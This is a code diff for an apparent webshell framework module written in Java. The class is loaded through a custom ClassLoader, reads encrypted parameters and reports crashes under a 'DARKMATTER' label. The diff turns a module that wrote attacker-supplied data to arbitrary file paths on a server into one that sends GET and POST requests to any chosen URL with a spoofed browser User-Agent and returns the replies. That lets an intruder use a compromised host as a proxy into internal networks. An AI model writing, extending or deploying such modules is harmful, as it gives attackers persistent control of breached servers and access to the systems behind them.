@@ -1,18 +1,20 @@
+import java.io.ByteArrayOutputStream;
+import java.io.InputStream;
 import java.io.OutputStream;
 import java.io.PrintWriter;
 import java.io.StringWriter;
 import java.lang.reflect.Method;
+import java.net.HttpURLConnection;
+import java.net.URL;
 import java.nio.charset.StandardCharsets;
-import java.nio.file.Files;
-import java.nio.file.Paths;
 import java.util.Base64;
 import java.util.HashMap;
 import java.util.Map;
 
-public class file_write extends ClassLoader
+public class http extends ClassLoader
 {
-    public file_write(ClassLoader objParent) { super(objParent); }
-    public file_write() { super(file_write.class.getClassLoader()); }
+    public http(ClassLoader objParent) { super(objParent); }
+    public http() { super(http.class.getClassLoader()); }
 
     private Map<String, String> fnParseParams(String szParamStr)
     {
@@ -60,10 +62,7 @@ public class file_write extends ClassLoader
             Method fnFlushBuffer = objResponse.getClass().getMethod("flushBuffer", new Class[0]);
             fnFlushBuffer.invoke(objResponse, new Object[0]);
         }
-        catch (Exception exIgnored)
-        {
-
-        }
+        catch (Exception exIgnored) {}
     }
 
     private byte[] Encrypt(Object objPageContext, byte[] abRawResponse)
@@ -129,21 +128,56 @@ public class file_write extends ClassLoader
             String szParam = new String(abPayload, nParamOffset, nParamLength, "UTF-8").trim();
 
             Map<String, String> mapParams = fnParseParams(szParam);
-            String szSplitter = mapParams.get("splitter");
             StringBuilder sb = new StringBuilder();
 
-            String szPath = new String(Base64.getDecoder().decode(mapParams.get("z0")), StandardCharsets.UTF_8);
-            byte[] abContent = Base64.getDecoder().decode(mapParams.get("z1"));
+            String z0 = mapParams.get("z0");
+            String szAction = (z0 != null) ? new String(Base64.getDecoder().decode(z0), StandardCharsets.UTF_8).trim() : "";
 
-            if (!szPath.isEmpty())
+            String szStatus = "error";
+            String szHttpCode = "null";
+            String szDataResult = "";
+
+            if (szAction.equalsIgnoreCase("get"))
             {
-                Files.write(Paths.get(szPath), abContent);
-                sb.append("1");
+                String z1 = mapParams.get("z1");
+                if (z1 == null)
+                {
+                    szDataResult = "Missing URL";
+                }
+                else
+                {
+                    String szURL = new String(Base64.getDecoder().decode(z1), StandardCharsets.UTF_8).trim();
+                    String[] httpRes = fnExecuteHttp("GET", szURL, null);
+                    szStatus = "ok";
+                    szHttpCode = httpRes[0];
+                    szDataResult = httpRes[1];
+                }
+            }
+            else if (szAction.equalsIgnoreCase("post"))
+            {
+                String z1 = mapParams.get("z1");
+                String z2 = mapParams.get("z2");
+
+                if (z1 == null || z1.isEmpty())
+                {
+                    szDataResult = "Missing URL";
+                }
+                else
+                {
+                    String szURL = new String(Base64.getDecoder().decode(z1), StandardCharsets.UTF_8).trim();
+                    String szPostData = (z2 != null) ? new String(Base64.getDecoder().decode(z2), StandardCharsets.UTF_8).trim() : "";
+                    String[] httpRes = fnExecuteHttp("POST", szURL, szPostData);
+                    szStatus = "ok";
+                    szHttpCode = httpRes[0];
+                    szDataResult = httpRes[1];
+                }
             }
             else
             {
-                sb.append("ERROR://Invalid or empty file path.");
+                szDataResult = "Invalid action";
             }
+
+            sb.append("{\"status\":\"" + szStatus + "\"," + "\"action\":\"" + fnEscapeJson(szAction) + "\"," + "\"http_code\":" + szHttpCode + "," + "\"data\":\"" + fnEscapeJson(szDataResult) + "\"}");
 
             fnWriteOutput(objParam, objResponse, osClient, sb.toString().getBytes());
         }
@@ -155,13 +189,99 @@ public class file_write extends ClassLoader
                 {
                     StringWriter swTrace = new StringWriter();
                     ex.printStackTrace(new PrintWriter(swTrace));
-
                     osClient.write(("DARKMATTER_INTERNAL_CRASHED: " + swTrace.toString()).getBytes());
                 }
-                catch (Exception exIgnored) {}
+                catch (Exception exIgnored) 
+                {
+                    
+                }
             }
         }
 
         return true;
+    }
+
+    private String fnEscapeJson(String str) {
+        if (str == null) return "";
+        return str.replace("\\", "\\\\")
+                  .replace("\"", "\\\"")
+                  .replace("\b", "\\b")
+                  .replace("\f", "\\f")
+                  .replace("\n", "\\n")
+                  .replace("\r", "\\r")
+                  .replace("\t", "\\t");
+    }
+
+    private String[] fnExecuteHttp(String szMethod, String szUrl, String szPostData)
+    {
+        String[] result = new String[]{"0", ""}; // [0] = HTTP Code, [1] = Body / Error Msg
+        HttpURLConnection connection = null;
+        InputStream is = null;
+        ByteArrayOutputStream baos = null;
+
+        try
+        {
+            URL url = new URL(szUrl);
+            connection = (HttpURLConnection) url.openConnection();
+            connection.setRequestMethod(szMethod.toUpperCase());
+            connection.setConnectTimeout(15000);
+            connection.setReadTimeout(15000);
+            connection.setInstanceFollowRedirects(true);
+            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
+
+            if ("POST".equalsIgnoreCase(szMethod))
+            {
+                connection.setDoOutput(true);
+                connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+                if (szPostData != null)
+                {
+                    byte[] postBytes = szPostData.getBytes(StandardCharsets.UTF_8);
+                    connection.setRequestProperty("Content-Length", String.valueOf(postBytes.length));
+                    try (OutputStream os = connection.getOutputStream()) {
+                        os.write(postBytes);
+                    }
+                }
+            }
+
+            int responseCode = connection.getResponseCode();
+            result[0] = String.valueOf(responseCode);
+
+            if (responseCode >= 200 && responseCode < 400)
+            {
+                is = connection.getInputStream();
+            } 
+            else
+            {
+                is = connection.getErrorStream();
+            }
+
+            if (is != null)
+            {
+                baos = new ByteArrayOutputStream();
+                byte[] buffer = new byte[4096];
+                int len;
+                while ((len = is.read(buffer)) != -1)
+                    baos.write(buffer, 0, len);
+
+                result[1] = baos.toString("UTF-8");
+            }
+
+        }
+        catch (Exception e)
+        {
+            if (result[0].equals("0"))
+                result[0] = "500";
+
+            result[1] = e.getMessage();
+
+        }
+        finally
+        {
+            if (baos != null) try { baos.close(); } catch (Exception e) {}
+            if (is != null) try { is.close(); } catch (Exception e) {}
+            if (connection != null) connection.disconnect();
+        }
+
+        return result;
     }
 }
